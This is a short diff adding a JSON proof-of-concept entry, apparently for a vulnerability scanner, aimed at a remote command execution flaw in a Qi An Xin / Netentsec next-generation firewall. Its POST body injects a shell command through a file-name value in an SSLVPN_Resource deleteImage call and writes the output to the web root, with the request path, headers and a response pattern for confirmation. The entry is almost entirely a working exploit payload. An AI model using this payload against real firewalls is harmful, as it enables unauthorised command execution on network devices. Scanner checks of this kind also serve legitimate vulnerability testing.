@@ -1,0 +1,16 @@
+{
+	"name":"奇安信网康下一代防火墙directdata远程命令执行",
+	"tag":"qianxin",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/directdata/direct/router",
+		"pocPost":"{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;id >/var/www/html/test.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"}",
+		"header":{
+			"Upgrade-Insecure-Requests":" 1",
+			"Connection":" close",
+			"Content-Length":" 160"
+		},
+		"status_code":"200",
+		"pattern":"(SSLVPN_Resource)"
+	}
+}
